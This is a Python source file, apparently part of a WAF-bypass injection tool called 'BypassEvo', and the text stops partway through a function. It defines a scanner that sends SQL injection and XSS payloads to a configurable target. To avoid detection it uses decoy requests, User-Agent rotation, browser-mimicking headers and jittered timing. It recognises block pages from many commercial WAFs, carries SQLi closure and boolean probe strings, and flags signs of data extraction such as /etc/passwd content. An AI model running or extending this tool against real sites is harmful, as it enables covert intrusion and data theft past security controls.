"""HTTP scanner and response analyzer for BypassEvo.
Supports DVWA cookie-based authentication.

Key safety features:
  - Configurable request delay + jitter (anti-ban)
  - Baseline response capture (anti-false-positive)
  - Rate limit detection (429, Retry-After)
  - Consecutive block counter (auto-pause)
"""

import re
import time
import random
import requests
from dataclasses import dataclass, field
from tools.sql_error_kb import get_kb


@dataclass
class ScanResult:
    url: str
    method: str
    status_code: int
    response_text: str
    response_time: float
    headers: dict
    payload: str = ""
    success: bool = False
    evidence: str = ""
    indicators: list = field(default_factory=list)
    dbms_hint: str = "unknown"
    confidence: float = 0.0


@dataclass
class BaselineResponse:
    """Captured baseline (benign) response for comparison."""
    status_code: int = 200
    body: str = ""
    body_length: int = 0
    headers: dict = field(default_factory=dict)
    response_time: float = 0.0


SQL_ERROR_PATTERNS = {
    "mysql": [
        r"you have an error in your sql syntax",
        r"warning.*mysql",
        r"unclosed quotation mark",
        r"mysql_fetch",
        r"mysql_num_rows",
        r"supplied argument is not a valid",
    ],
    "postgresql": [
        r"pg_query",
        r"pg_exec",
        r"postgresql.*error",
        r"unterminated quoted string",
    ],
    "mssql": [
        r"microsoft ole db provider",
        r"unclosed quotation mark after the character string",
        r"microsoft sql native client error",
    ],
    "oracle": [
        r"ora-\d{5}",
        r"oracle.*error",
        r"quoted string not properly terminated",
    ],
    "sqlite": [
        r"sqlite3\.operationalerror",
        r"sqlite.*error",
        r"unrecognized token",
    ],
}

XSS_INDICATORS = [
    r"<script>alert",
    r"onerror\s*=",
    r"onload\s*=",
    r"javascript:",
    r"<img[^>]+onerror",
    r"<svg[^>]+onload",
]

# UNION-based data extraction signals
UNION_DATA_PATTERNS = [
    (r"@@version", 0.95, "MySQL @@version"),
    (r"@@datadir", 0.95, "MySQL @@datadir"),
    (r"@@hostname", 0.90, "MySQL @@hostname"),
    (r"database\(\)", 0.90, "database() function"),
    (r"version\(\)", 0.85, "version() function"),
    (r"user\(\)", 0.85, "user() function"),
    (r"information_schema", 0.95, "information_schema access"),
    (r"table_schema", 0.90, "table_schema column"),
    (r"table_name", 0.85, "table_name column"),
    (r"column_name", 0.85, "column_name column"),
    (r"group_concat", 0.90, "MySQL group_concat"),
    (r"concat_ws", 0.85, "concat_ws function"),
    (r"string_agg", 0.90, "PostgreSQL string_agg"),
    (r"for xml", 0.90, "MSSQL FOR XML"),
    (r"unhex\(", 0.80, "MySQL unhex"),
    (r"hex\(", 0.70, "MySQL hex"),
    (r"load_file", 0.90, "MySQL load_file"),
    (r"into\s+outfile", 0.90, "MySQL INTO OUTFILE"),
    (r"into\s+dumpfile", 0.90, "MySQL INTO DUMPFILE"),
]

# Database metadata patterns (data extraction confirmation)
DB_METADATA_PATTERNS = [
    (r"mysql.*[0-9]+\.[0-9]+\.[0-9]+", 0.90, "MySQL version string"),
    (r"mariadb.*[0-9]+\.[0-9]+", 0.90, "MariaDB version string"),
    (r"postgresql.*[0-9]+\.[0-9]+", 0.90, "PostgreSQL version string"),
    (r"oracle.*[0-9]+\.[0-9]+", 0.85, "Oracle version string"),
    (r"\d+\.\d+\.\d+[-+]\w+", 0.75, "Version string with suffix"),
    # NOTE: MD5/SHA1 hash patterns removed — too generic, cause false positives
    # (any 32/40-char hex string in HTML attributes, CSS, etc. would match)
    (r"root:.*:0:0:", 0.95, "/etc/passwd content"),
    (r"uid=\d+\(.*?\)", 0.95, "Linux id command output"),
]

# Common WAF block page keywords (for 200-status block detection)
BLOCK_PAGE_KEYWORDS = [
    # English WAFs
    "access denied", "forbidden", "blocked", "mod_security", "modsecurity",
    "security violation", "firewall", "request blocked", "not acceptable",
    "cloudflare", "incapsula", "imperva", "wordfence", "sucuri",
    "your request has been blocked", "contact support",
    "error 403", "error 406", "attack detected",
    # Chinese commercial WAFs
    "请求被拦截", "访问被拒绝", "安全拦截", "恶意请求",
    "您的请求存在异常", "网站防火墙", "waf拦截",
    "长亭", "chaitin", "safeline", "雷池",
    "腾讯云waf", "tencent cloud", "玄武盾",
    "安恒", "dbappwaf", "明御",
    "阿里云盾", "alibaba cloud", "yundun",
    "网宿", "创宇盾", "知道创宇",
    "防护已开启", "非法请求", "异常访问",
]

# Login page indicators — response likely redirected to login form
LOGIN_PAGE_KEYWORDS = [
    "login", "log in", "sign in", "username", "password",
    "please login", "please log in", "session expired",
    "authentication required", "unauthorized",
]

# Realistic browser headers to avoid WAF/reverse-proxy fingerprinting
BROWSER_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/125.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24", "Google Chrome";v="125"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
}


class Scanner:
    def __init__(
        self,
        base_url: str,
        timeout: int = 10,
        php_sessid: str = "",
        request_delay: float = 1.0,
        delay_jitter: float = 0.5,
        backoff_on_429: float = 30.0,
        backoff_on_block: float = 5.0,
        max_consecutive_blocks: int = 10,
        block_pause: float = 60.0,
        backoff_multiplier: float = 2.0,
        max_backoff: float = 120.0,
        jitter_distribution: str = "uniform",
    ):
        # Normalize base_url to scheme+host only, strip any path portion
        # to avoid duplicating paths when joining with endpoint
        from urllib.parse import urlparse, urljoin
        parsed = urlparse(base_url)
        self.base_url = f"{parsed.scheme}://{parsed.netloc}".rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(BROWSER_HEADERS)

        # User-Agent rotation pool for stealth
        self._user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0 Safari/537.36",
        ]
        self._decoy_counter = 0
        self._decoy_interval = 3  # Send decoy every N requests

        if php_sessid:
            self.session.cookies.set("PHPSESSID", php_sessid, path="/")
            self.session.cookies.set("security", "low", path="/")

        # Rate limiting — base values
        self._base_request_delay = request_delay
        self._base_backoff_on_429 = backoff_on_429
        self._base_backoff_on_block = backoff_on_block
        # Current active values (may be overridden by stage config)
        self.request_delay = request_delay
        self.delay_jitter = delay_jitter
        self.backoff_on_429 = backoff_on_429
        self.backoff_on_block = backoff_on_block
        self.max_consecutive_blocks = max_consecutive_blocks
        self.block_pause = block_pause
        # Exponential backoff
        self.backoff_multiplier = backoff_multiplier
        self.max_backoff = max_backoff
        self.jitter_distribution = jitter_distribution  # "uniform" | "normal"

        # State tracking
        self._last_request_time = 0.0
        self._consecutive_blocks = 0
        self._consecutive_rate_limits = 0  # For exponential backoff on 429
        self._total_requests = 0
        self._baseline: BaselineResponse | None = None
        self._current_delay = request_delay  # Actual delay applied on last request

    def _build_url(self, path: str) -> str:
        """Join base_url with path, avoiding duplicate slashes."""
        path = path.lstrip("/") if path.startswith("/") else path
        return f"{self.base_url}/{path}"

    def _send_decoy(self, path: str):
        """Send a benign request to blend in with normal traffic."""
        try:
            decoy_params = ["test", "1", "hello", "page1", "home", "about"]
            param_value = random.choice(decoy_params)
            url = self._build_url(path)
            self._throttle()
            self.session.get(url, params={"q": param_value}, timeout=self.timeout)
        except Exception:
            pass  # Decoy failures are silent

    def set_dvwa_auth(self, php_sessid: str, security: str = "low"):
        """Set DVWA session cookie."""
        self.session.cookies.set("PHPSESSID", php_sessid, path="/")
        self.session.cookies.set("security", security, path="/")

    def set_rate_limit(self, config):
        """Switch active rate limit config (for per-stage overrides)."""
        self.request_delay = config.request_delay
        self._base_request_delay = config.request_delay
        self.delay_jitter = config.delay_jitter
        self.backoff_on_429 = config.backoff_on_429
        self._base_backoff_on_429 = config.backoff_on_429
        self.backoff_on_block = config.backoff_on_block
        self._base_backoff_on_block = config.backoff_on_block
        self.max_consecutive_blocks = config.max_consecutive_blocks
        self.block_pause = config.block_pause
        self.backoff_multiplier = config.backoff_multiplier
        self.max_backoff = config.max_backoff
        self.jitter_distribution = config.jitter_distribution
        # Reset backoff counters on stage switch
        self._consecutive_rate_limits = 0
        self._consecutive_blocks = 0

    def get_rate_limit_status(self) -> dict:
        """Return current rate limit state for frontend visualization."""
        return {
            "current_delay": round(self._current_delay, 2),
            "base_delay": round(self._base_request_delay, 2),
            "backoff_level": self._consecutive_rate_limits,
            "consecutive_blocks": self._consecutive_blocks,
            "max_consecutive_blocks": self.max_consecutive_blocks,
            "is_backing_off": self._consecutive_rate_limits > 0,
        }

    def capture_baseline(self, path: str = "/") -> BaselineResponse:
        """Capture a benign baseline response for false-positive comparison."""
        url = self._build_url(path)
        try:
            self._throttle()
            resp = self.session.get(url, params={"q": "test"}, timeout=self.timeout)
            self._baseline = BaselineResponse(
                status_code=resp.status_code,
                body=resp.text[:3000],
                body_length=len(resp.text),
                headers=dict(resp.headers),
                response_time=resp.elapsed.total_seconds(),
            )
            return self._baseline
        except Exception:
            self._baseline = BaselineResponse()
            return self._baseline

    def recon(self, path: str = "/") -> dict:
        url = self._build_url(path)
        try:
            self._throttle()
            resp = self.session.get(url, timeout=self.timeout)
            html = resp.text
            return {
                "url": url,
                "status": resp.status_code,
                "html": html[:5000],
                "headers": dict(resp.headers),
                "forms": self._extract_forms(html),
                "links": self._extract_links(html),
            }
        except Exception as e:
            return {"url": url, "error": str(e)}

    def inject(
        self,
        path: str,
        payload: str,
        param: str = "id",
        method: str = "GET",
        data: dict = None,
    ) -> ScanResult:
        url = self._build_url(path)

        self._throttle()

        # Behavioral stealth: periodic decoy requests
        self._decoy_counter += 1
        if self._decoy_counter >= self._decoy_interval:
            self._decoy_counter = 0
            self._send_decoy(path)
            self._throttle()  # Extra delay after decoy

        start = time.time()

        try:
            if method.upper() == "GET":
                resp = self.session.get(
                    url, params={param: payload}, timeout=self.timeout
                )
            else:
                post_data = data or {}
                post_data[param] = payload
                resp = self.session.post(url, data=post_data, timeout=self.timeout)

            elapsed = time.time() - start
            self._total_requests += 1

            # Check for 429 rate limiting — with exponential backoff
            if resp.status_code == 429:
                self._consecutive_rate_limits += 1
                retry_after = resp.headers.get("Retry-After")
                if retry_after:
                    base_wait = float(retry_after)
                else:
                    base_wait = self.backoff_on_429
                # Exponential backoff: base * multiplier^level, capped
                wait = min(base_wait * (self.backoff_multiplier ** (self._consecutive_rate_limits - 1)), self.max_backoff)
                self._current_delay = wait
                time.sleep(wait)
                return ScanResult(
                    url=url, method=method, status_code=429,
                    response_text="RATE LIMITED", response_time=elapsed, headers=dict(resp.headers),
                    payload=payload,
                    evidence=f"Rate limited (429). Backoff level {self._consecutive_rate_limits}. Waited {wait:.1f}s.",
                    indicators=["rate_limited"], confidence=0.0,
                )

            # Check for 502 Bad Gateway — retry once with backoff
            if resp.status_code == 502:
                self._consecutive_rate_limits += 1
                retry_wait = min(
                    3.0 * (self.backoff_multiplier ** (self._consecutive_rate_limits - 1)),
                    self.max_backoff,
                )
                self._current_delay = retry_wait
                time.sleep(retry_wait)
                # Retry the same request once
                try:
                    if method.upper() == "GET":
                        resp = self.session.get(url, params={param: payload}, timeout=self.timeout)
                    else:
                        post_data = data or {}
                        post_data[param] = payload
                        resp = self.session.post(url, data=post_data, timeout=self.timeout)
                    elapsed = time.time() - start
                    if resp.status_code != 502:
                        # Retry succeeded, fall through to normal processing
                        pass
                    else:
                        return ScanResult(
                            url=url, method=method, status_code=502,
                            response_text=resp.text[:500], response_time=elapsed, headers=dict(resp.headers),
                            payload=payload,
                            evidence=(
                                f"502 Bad Gateway after retry (backoff {retry_wait:.1f}s). "
                                f"Possible causes: target overloaded, reverse proxy timeout, "
                                f"or WAF dropping connections. Auto-increasing delay."
                            ),
                            indicators=["server_error", "bad_gateway"], confidence=0.0,
                        )
                except Exception:
                    return ScanResult(
                        url=url, method=method, status_code=502,
                        response_text="502 + retry failed", response_time=elapsed, headers={},
                        payload=payload,
                        evidence="502 Bad Gateway — retry also failed.",
                        indicators=["server_error", "bad_gateway"], confidence=0.0,
                    )

            result = ScanResult(
                url=resp.url,
                method=method,
                status_code=resp.status_code,
                response_text=resp.text[:5000],
                response_time=elapsed,
                headers=dict(resp.headers),
                payload=payload,
            )
            self._analyze(result)

            # Track consecutive blocks with exponential backoff
            if self._is_waf_block(result):
                self._consecutive_blocks += 1
                if self._consecutive_blocks >= self.max_consecutive_blocks:
                    result.indicators.append("consecutive_block_limit")
                    pause = min(
                        self.block_pause * (self.backoff_multiplier ** (self._consecutive_blocks - self.max_consecutive_blocks)),
                        self.max_backoff,
                    )
                    self._current_delay = pause
                    result.evidence += f" [AUTO-PAUSE: {self._consecutive_blocks} consecutive blocks, backoff {pause:.1f}s]"
                    self._consecutive_blocks = 0
                    time.sleep(pause)
            else:
                self._consecutive_blocks = 0
                self._consecutive_rate_limits = 0  # Reset 429 backoff on success

            return result

        except requests.Timeout:
            self._consecutive_blocks = 0  # Reset block streak on timeout
            return ScanResult(
                url=url, method=method, status_code=0,
                response_text="TIMEOUT", response_time=self.timeout, headers={},
                payload=payload, evidence="Request timed out (possible time-based SQLi)",
                indicators=["timeout"], confidence=0.6,
            )
        except Exception as e:
            return ScanResult(
                url=url, method=method, status_code=0,
                response_text=str(e), response_time=time.time() - start, headers={},
                payload=payload, evidence=f"Error: {e}", confidence=0.0,
            )

    def is_blocked(self, result: ScanResult) -> bool:
        """Determine if a response indicates WAF blocking.

        Uses multi-signal detection:
          1. Status code (403, 406, 429, 503)
          2. Body keywords (access denied, blocked, etc.)
          3. Baseline comparison (response differs significantly from benign)
        """
        # Signal 1: Status code
        if result.status_code in (403, 406, 429, 503):
            return True

        # Signal 2: Body keywords
        text_lower = result.response_text.lower()
        for keyword in BLOCK_PAGE_KEYWORDS:
            if keyword in text_lower:
                return True

        # Signal 3: Baseline comparison
        if self._baseline and self._baseline.body:
            # If response body is drastically different from baseline AND status changed
            if (result.status_code != self._baseline.status_code
                    and result.status_code in (403, 406, 503)):
                return True

        # Signal 4: Response body drastically shorter than baseline (WAF replaced content)
        if self._baseline and self._baseline.body_length > 0:
            if len(result.response_text) < self._baseline.body_length * 0.3 and result.status_code == 200:
                # Response is less than 30% of baseline length — likely a WAF block page
                # But only if it also contains suspicious keywords
                if any(kw in text_lower for kw in ["security", "blocked", "denied", "firewall", "拦截", "异常"]):
                    return True

        # Signal 5: 302 redirect to a WAF verification/challenge page
        if result.status_code in (302, 301):
            location = result.headers.get("Location", "").lower()
            if any(kw in location for kw in ["challenge", "captcha", "verify", "waf", "security", "block"]):
                return True

        return False

    def is_likely_false_positive(self, result: ScanResult) -> bool:
        """Check if a 'passed' result might be a false positive.

        False positive scenarios:
          1. Response is identical to baseline (payload had no effect)
          2. Response is empty or very short
          3. Response contains WAF block page indicators despite 200 status
        """
        text = result.response_text.strip()

        # Empty or trivial response
        if len(text) < 10:
            return True

        # 200-status block page detection
        if result.status_code == 200:
            text_lower = text.lower()
            # Check for common WAF block page patterns that return 200
            false_positive_patterns = [
                r"your.ip.has.been.blocked",
                r"contact.your.administrator",
                r"request.could.not.be.processed",
                r"security.alert",
                r"please.verify.you.are.human",
                r"captcha",
                r"challenge.platform",  # Cloudflare challenge
            ]
            for pattern in false_positive_patterns:
                if re.search(pattern, text_lower):
                    return True

        return False

    def analyze_response_vs_baseline(self, result: ScanResult) -> dict:
        """Analyze whether a response shows signs of successful injection.

        Returns:
            {
                "is_bypass": bool,      # True if response shows injection effect
                "confidence": float,    # 0.0-1.0
                "evidence": str,        # Why we think it's a bypass or not
                "has_sql_error": bool,
                "content_changed": bool,
                "similarity": float,    # 0.0-1.0 similarity to baseline
            }
        """
        text = result.response_text.strip()
        text_lower = text.lower()
        evidence_parts = []

        # Check for SQL errors in response — strong injection signal
        sql_error_patterns = [
            r"you have an error in your sql syntax",
            r"warning.*mysql",
            r"unclosed quotation mark",
            r"mysql_fetch",
            r"supplied argument is not a valid",
            r"pg_query",
            r"unterminated quoted string",
            r"microsoft ole db provider",
            r"ora-\d{5}",
            r"sqlite.*error",
        ]
        has_sql_error = any(re.search(p, text_lower) for p in sql_error_patterns)
        if has_sql_error:
            evidence_parts.append("SQL error in response")

        # Compare to baseline
        similarity = 1.0
        content_changed = False
        if self._baseline and self._baseline.body:
            from difflib import SequenceMatcher
            similarity = SequenceMatcher(
                None, self._baseline.body[:1000], text[:1000]
            ).ratio()
            content_changed = similarity < 0.90

        if content_changed:
            evidence_parts.append(f"content differs from baseline (sim={similarity:.2f})")

        # Determine if this is a real bypass
        is_bypass = False
        confidence = 0.0

        if has_sql_error:
            # SQL error visible — injection definitely worked
            is_bypass = True
            confidence = 0.9
        elif content_changed and result.status_code == 200:
            # Content changed, no block — likely bypass
            is_bypass = True
            confidence = 0.6
        elif not content_changed and result.status_code == 200:
            # Same as baseline — payload had no effect
            is_bypass = False
            confidence = 0.1
            evidence_parts.append("response identical to baseline — payload had no effect")

        return {
            "is_bypass": is_bypass,
            "confidence": confidence,
            "evidence": "; ".join(evidence_parts) if evidence_parts else "no significant signals",
            "has_sql_error": has_sql_error,
            "content_changed": content_changed,
            "similarity": similarity,
        }

    def _is_waf_block(self, result: ScanResult) -> bool:
        """Internal check for WAF block (for consecutive block tracking)."""
        if result.status_code in (403, 406, 429, 503):
            return True
        text_lower = result.response_text.lower()
        return any(kw in text_lower for kw in BLOCK_PAGE_KEYWORDS[:8])

    def _is_login_page(self, text_lower: str) -> bool:
        """Check if response looks like a login/redirect page.

        DVWA returns a login form when PHPSESSID is missing or expired.
        Heuristic: has <form with password input + login-related keywords.
        """
        # Must have a password field to be a login form
        if "type=\"password\"" not in text_lower and "type='password'" not in text_lower:
            return False
        # At least one login-related keyword
        keyword_hits = sum(1 for kw in LOGIN_PAGE_KEYWORDS if kw in text_lower)
        return keyword_hits >= 2

    def _compute_jitter(self, base_delay: float) -> float:
        """Compute jitter around base_delay.

        uniform: classic [0, delay_jitter] random offset
        normal:  gaussian centered on base_delay, spread in [base*0.6, base*1.4]
        """
        if self.jitter_distribution == "normal":
            # Gaussian jitter: mean=base_delay, sigma=base_delay*0.15
            # ~95% of values fall within [base*0.6, base*1.4]
            sigma = max(base_delay * 0.15, 0.05)
            return max(base_delay * 0.6, random.gauss(base_delay, sigma))
        else:
            # Legacy uniform jitter
            return base_delay + random.uniform(0, self.delay_jitter)

    def _throttle(self):
        """Enforce request delay with smart jitter."""
        if self._last_request_time > 0:
            elapsed = time.time() - self._last_request_time
            required_delay = self._compute_jitter(self.request_delay)
            self._current_delay = required_delay
            if elapsed < required_delay:
                time.sleep(required_delay - elapsed)
        self._last_request_time = time.time()
        # Rotate User-Agent occasionally for stealth
        if self._total_requests % 10 == 0 and self._user_agents:
            self.session.headers["User-Agent"] = random.choice(self._user_agents)

    def _analyze(self, result: ScanResult):
        text = result.response_text
        text_lower = text.lower()

        # ── 0. Login Page Detection — PHPSESSID expired or missing ───
        if self._is_login_page(text_lower):
            result.indicators.append("login_page")
            result.evidence = "Login page detected — PHPSESSID may be expired or missing. Re-authenticate and update PHPSESSID."
            result.confidence = 0.0
            result.success = False
            return

        # ── 1. SQL Error Detection (via Knowledge Base) — HIGHEST PRIORITY ──
        kb = get_kb()
        kb_matches = kb.match(text)
        if kb_matches:
            best_desc, best_conf, best_dbms = max(kb_matches, key=lambda x: x[1])
            result.dbms_hint = best_dbms if best_dbms != "generic" else kb.get_dbms_hint(text)
            result.indicators.append(f"sql_error_{result.dbms_hint}")
            matched_descs = [m[0] for m in kb_matches[:3]]
            result.evidence = f"SQL error detected ({result.dbms_hint}): {', '.join(matched_descs)}"
            result.confidence = max(result.confidence, best_conf)
            result.success = True
            # KB match at confidence >= 0.85 is definitive — skip further analysis
            if best_conf >= 0.85:
                return

        # ── 2. XSS reflection detection ──────────────────────────────────
        for pattern in XSS_INDICATORS:
            if re.search(pattern, text, re.IGNORECASE):
                result.indicators.append("xss_reflection")
                result.evidence = f"XSS indicator found: matched '{pattern}'"
                result.confidence = max(result.confidence, 0.8)
                result.success = True
                return

        # ── 3. UNION data extraction detection ───────────────────────────
        for pattern, conf, desc in UNION_DATA_PATTERNS:
            if re.search(pattern, text_lower):
                result.indicators.append("union_data")
                result.evidence = f"UNION data extraction: {desc} found in response"
                result.confidence = max(result.confidence, conf)
                result.success = True
                return

        # ── 4. Database metadata detection ────────────────────────────────
        for pattern, conf, desc in DB_METADATA_PATTERNS:
            if re.search(pattern, text_lower):
                result.indicators.append("db_metadata")
                result.evidence = f"Database metadata: {desc}"
                result.confidence = max(result.confidence, conf)
                result.success = True
                return

        # ── 5. Time-based blind injection ─────────────────────────────────
        if result.response_time > 2.5:
            result.indicators.append("time_delay_heavy")
            result.evidence = f"Time-based blind: response took {result.response_time:.1f}s (>2.5s threshold)"
            result.confidence = max(result.confidence, 0.80)
            result.success = True
            return
        elif result.response_time > 1.5 and self._baseline and self._baseline.response_time > 0:
            ratio = result.response_time / self._baseline.response_time
            if ratio > 3.0:
                result.indicators.append("time_delay")
                result.evidence = f"Time-based blind: {result.response_time:.1f}s vs baseline {self._baseline.response_time:.1f}s (ratio={ratio:.1f}x)"
                result.confidence = max(result.confidence, 0.70)
                result.success = True
                return

        # ── 6. Payload reflection (basic) ─────────────────────────────────
        if result.payload and result.payload in result.response_text:
            result.indicators.append("payload_reflected")
            result.evidence = "Payload reflected in response"
            result.confidence = max(result.confidence, 0.5)

    def _extract_forms(self, html: str) -> list:
        forms = []
        form_pattern = re.compile(
            r"<form[^>]*action=['\"]([^'\"]*)['\"][^>]*method=['\"](\w+)['\"][^>]*>",
            re.IGNORECASE,
        )
        for match in form_pattern.finditer(html):
            forms.append({"action": match.group(1), "method": match.group(2)})
        return forms

    def _extract_links(self, html: str) -> list:
        return list(set(re.findall(r'href=["\']([^"\']+)["\']', html)))

    def get_stats(self) -> dict:
        """Return scanner statistics."""
        return {
            "total_requests": self._total_requests,
            "consecutive_blocks": self._consecutive_blocks,
            "baseline_captured": self._baseline is not None,
            "rate_limit_status": self.get_rate_limit_status(),
        }

    # ── WAF Paranoia Level Estimation ───────────────────────────────────

    def estimate_waf_paranoia(self, blocked_payloads: list[str], passed_payloads: list[str]) -> dict:
        """Estimate WAF paranoia level from block/pass patterns.

        Returns:
            {"level": 1-4, "confidence": float, "signals": [...], "description": "..."}
        """
        if not blocked_payloads:
            return {"level": 0, "confidence": 0.0, "signals": [], "description": "No block data"}

        signals = []
        level = 1

        # Count what types of payloads were blocked
        blocked_lower = [p.lower() for p in blocked_payloads]
        passed_lower = [p.lower() for p in passed_payloads]

        # Level 2: blocks basic SQL keywords
        basic_keywords = ["union select", "or 1=1", "and 1=1", "--", "'"]
        basic_blocked = sum(1 for kw in basic_keywords if any(kw in b for b in blocked_lower))
        if basic_blocked >= 2:
            level = max(level, 2)
            signals.append(f"Blocks basic SQLi ({basic_blocked}/5 keywords)")

        # Level 3: blocks encoded/obfuscated variants
        advanced_patterns = ["un/**/ion", "sel/**/ect", "%27", "%09", "/*!", "0x"]
        adv_blocked = sum(1 for pat in advanced_patterns if any(pat in b for b in blocked_lower))
        if adv_blocked >= 2:
            level = max(level, 3)
            signals.append(f"Blocks encoded variants ({adv_blocked}/6 patterns)")

        # Level 4: blocks even aggressive bypasses
        aggressive_patterns = ["chr(", "char(", "concat(", "hex(", "unhex(", "benchmark("]
        agg_blocked = sum(1 for pat in aggressive_patterns if any(pat in b for b in blocked_lower))
        if agg_blocked >= 2:
            level = max(level, 4)
            signals.append(f"Blocks aggressive bypasses ({agg_blocked}/6 patterns)")

        # Confidence based on data volume
        total = len(blocked_payloads) + len(passed_payloads)
        confidence = min(0.5 + total * 0.05, 0.95) if total > 0 else 0.0

        descriptions = {
            0: "No WAF or minimal filtering",
            1: "Basic keyword filtering (LOW paranoia)",
            2: "Standard SQLi pattern matching (MEDIUM paranoia)",
            3: "Deep inspection — blocks encoded variants (HIGH paranoia)",
            4: "Aggressive WAF — blocks even obfuscated payloads (MAXIMUM paranoia)",
        }

        return {
            "level": level,
            "confidence": confidence,
            "signals": signals,
            "description": descriptions.get(level, "Unknown"),
        }

    def collect_waf_signals(self, result: ScanResult) -> dict:
        """Collect WAF-related signals from a response for blind detection.

        Returns dict with WAF fingerprinting clues.
        """
        signals = {
            "is_blocked": self.is_blocked(result),
            "status_code": result.status_code,
            "has_waf_header": False,
            "waf_header_name": "",
            "has_error_page": False,
            "response_size": len(result.response_text),
            "content_type": result.headers.get("content-type", ""),
        }

        # Check for WAF-specific headers
        waf_header_names = [
            "x-sucuri-id", "x-akamai", "cf-ray", "x-amzn-requestid",
            "x-amz-cf-id", "x-iinfo", "x-cdn", "x-waf",
            "x-firewall", "x-security", "x-blocked-by",
        ]
        for header in waf_header_names:
            if header in {k.lower() for k in result.headers}:
                signals["has_waf_header"] = True
                signals["waf_header_name"] = header
                break

        # Check for error/block page signatures
        block_indicators = [
            "access denied", "forbidden", "blocked", "security violation",
            "attack detected", "request rejected", "firewall",
        ]
        text_lower = result.response_text.lower()
        for indicator in block_indicators:
            if indicator in text_lower:
                signals["has_error_page"] = True
                signals["error_page_indicator"] = indicator
                break

        return signals

    def detect_adaptive_waf(self, path: str, payload: str, param: str = "id", method: str = "GET") -> dict:
        """Detect if WAF is adapting to our attack patterns.
        
        Sends the same payload twice with a delay. If first passes but second blocks,
        the WAF is learning/adapting.
        
        Returns:
            {"is_adaptive": bool, "first_passed": bool, "second_passed": bool, "evidence": str}
        """
        # First attempt
        result1 = self.inject(path, payload, param, method)
        scan1 = ScanResult(url="", method=method, status_code=result1.status_code,
                           response_text=result1.response_text, response_time=result1.response_time,
                           headers=result1.headers, payload=payload)
        first_blocked = self.is_blocked(scan1)
        
        # Wait a bit (simulate normal browsing gap)
        time.sleep(self.request_delay * 2)
        
        # Second attempt — same payload
        result2 = self.inject(path, payload, param, method)
        scan2 = ScanResult(url="", method=method, status_code=result2.status_code,
                           response_text=result2.response_text, response_time=result2.response_time,
                           headers=result2.headers, payload=payload)
        second_blocked = self.is_blocked(scan2)
        
        is_adaptive = not first_blocked and second_blocked
        evidence = ""
        if is_adaptive:
            evidence = f"Payload passed on first attempt (status={result1.status_code}) but blocked on second (status={result2.status_code}). WAF is learning."
        elif first_blocked and second_blocked:
            evidence = "Both attempts blocked — WAF has static rules for this pattern."
        elif not first_blocked and not second_blocked:
            evidence = "Both attempts passed — no adaptive behavior detected."
        
        return {
            "is_adaptive": is_adaptive,
            "first_passed": not first_blocked,
            "second_passed": not second_blocked,
            "first_status": result1.status_code,
            "second_status": result2.status_code,
            "evidence": evidence,
        }

    # ── Injection Point Discovery ────────────────────────────────────────

    # Closure probes: (test_suffix, expected_error_indicator, quote_type)
    CLOSURE_PROBES = [
        ("'",  "single",  r"syntax error|mysql|unclosed|unterminated|pg_|ora-|sqlite"),
        ("\"", "double",  r"syntax error|mysql|unclosed|unterminated|pg_|ora-|sqlite"),
        ("')", "single_paren", r"syntax error|mysql|unclosed|unterminated|pg_|ora-|sqlite"),
        ("\")", "double_paren", r"syntax error|mysql|unclosed|unterminated|pg_|ora-|sqlite"),
        ("",   "numeric",  r"syntax error|mysql|unclosed|unterminated|pg_|ora-|sqlite"),
    ]

    # Boolean true/false pairs for confirmation
    BOOLEAN_PROBES = [
        # (suffix_true, suffix_false, quote_type, comment)
        (" AND 1=1-- ",  " AND 1=2-- ",  "single", "--"),
        (" AND 1=1-- ",  " AND 1=2-- ",  "double", "--"),
        ("' AND '1'='1", "' AND '1'='2", "single", ""),
        ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2", "double", ""),
        (" AND 1=1-- ",  " AND 1=2-- ",  "numeric", "--"),
        (") AND 1=1-- ", ") AND 1=2-- ", "single_paren", "--"),
        (") AND 1=1-- ", ") AND 1=2-- ", "double_paren", "--"),
    ]

    def probe_injection_point(
        self,
        path: str,
        param: str = "id",
        method: str = "GET",
        data: dict = None,
    ) -> dict:
        """Probe for SQL injection point: detect closure type and confirm injectability.

        Returns:
            {
                "is_injectable": bool,
                "quote_type": "single" | "double" | "numeric" | "single_paren" | "double_paren" | "unknown",
                "comment_style": "--" | "#" | "",
                "closure_char": "'" | "\"" | "" | "')" | "\")" ,
                "confidence": float,
                "test_results": [...],
                "dbms_hint": str,
            }
        """
        results = []
        detected_quote = "unknown"
        detected_comment = "--"
        is_injectable = False
        dbms_hint = "unknown"
        best_confidence = 0.0

        # Step 1: Get baseline response
        if not self._baseline:
            self.capture_baseline(path)
        baseline_len = self._baseline.body_length if self._baseline else 0
        baseline_time = self._baseline.response_time if self._baseline else 0.1

        # Step 2: Test closure characters — look for SQL errors
        # Also test with forced syntax errors to trigger clearer messages
        forced_probes = [
            ("'",  "single",  r"syntax error|mysql|unclosed|unterminated|pg_|ora-|sqlite"),
            ("\"", "double",  r"syntax error|mysql|unclosed|unterminated|pg_|ora-|sqlite"),
